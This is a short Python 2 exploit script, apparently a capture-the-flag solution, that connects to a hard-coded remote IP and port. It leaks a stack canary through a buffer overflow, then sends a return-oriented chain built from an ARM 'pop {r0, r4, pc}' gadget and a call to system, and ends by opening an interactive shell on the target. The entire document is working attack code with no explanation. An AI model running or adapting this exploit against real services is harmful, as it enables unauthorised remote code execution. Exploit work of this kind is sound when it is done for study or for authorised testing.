import socket, struct, telnetlib


def sock(remoteip, remoteport):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((remoteip, remoteport))
    return s, s.makefile('rw', bufsize=0)


def read_until(f, delim='\n'):
    data = ''
    while not data.endswith(delim):
      data += f.read(1)
    return data


def shell(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()


def p(a): return struct.pack("<I",a)
def u(a): return struct.unpack("<I",a)[0]
def p64(a): return struct.pack("<Q",a)
def u64(a): return struct.unpack("<Q",a)[0]


# s, f = sock("127.0.0.1", 4088)
#  nc 116.203.30.62 18113
s, f = sock('116.203.30.62', 18113)

read_until(f)

read_until(f, '> ')
buf = ''
buf += 'A' * (44 - 4)
buf += 'B'
f.write(buf)

data = read_until(f).strip('A').rstrip()
canary = u(data.replace('B', '\x00').ljust(4, '\x00'))
print hex(canary)

read_until(f, '> ')
buf = ''
buf += 'C' * 40
buf += p(canary)
buf += p(0xdeadbeaf)
buf += p(0xdeadbeaf)
buf += p(0xdeadbeaf)

buf += p(0x26b7c)
buf += p(0x71eb0)
buf += p(0xdeadbeaf)

buf += p(0x00016d90) # system
f.write(buf)

read_until(f, '> ')
f.write('\n')

#   26b7c:	e8bd8011 	pop	{r0, r4, pc}


shell(s)
